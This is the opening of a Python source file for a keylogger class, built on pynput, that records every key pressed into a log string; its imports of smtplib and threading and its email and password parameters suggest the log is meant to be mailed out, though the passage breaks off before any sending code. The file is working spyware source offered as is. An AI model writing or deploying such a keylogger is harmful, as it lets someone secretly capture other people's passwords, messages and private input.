#!/usr/bin/env python3

import smtplib
import threading
from pynput import keyboard

#class for keylogger

class KeyLogger:
    #defining __init__ variables

    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "Keylogger has started..."
        self.email = email
        self.password = password
        
    #creating log file where all keystrokes will be appended to
    def append_to_log(self, string):
        self.log = self.log + string

    #creating keylogger
    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)